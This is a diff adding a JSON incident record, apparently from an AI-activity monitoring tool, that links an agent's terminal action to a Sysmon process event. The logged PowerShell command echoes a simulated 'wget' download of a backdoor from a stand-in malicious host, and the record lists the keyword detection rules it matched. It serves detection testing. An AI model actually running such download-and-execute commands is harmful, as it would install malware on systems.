@@ -1,0 +1,25 @@
+{
+    "incident_id": "INC-0007",
+    "ai_event": {
+        "agent": "Background Script/AI",
+        "action": "terminal",
+        "timestamp": "2026-06-18T16:43:27.9007751Z"
+    },
+    "sysmon_event": {
+        "EventID": 1,
+        "TimestampUTC": "2026-06-18T16:43:27.9007751Z",
+        "ProcessId": "10224",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "powershell.exe  -Command \"Write-Host \"[ATTACK] wget http://malicious.site/backdoor.exe\"\"",
+        "ParentProcessId": "28188",
+        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+        "_correlated": true
+    },
+    "severity": "CRITICAL",
+    "matched_rules": [
+        "Suspicious Keyword: wget",
+        "Suspicious Keyword: http",
+        "Process: PowerShell",
+        "Network: Outbound Comm"
+    ]
+}
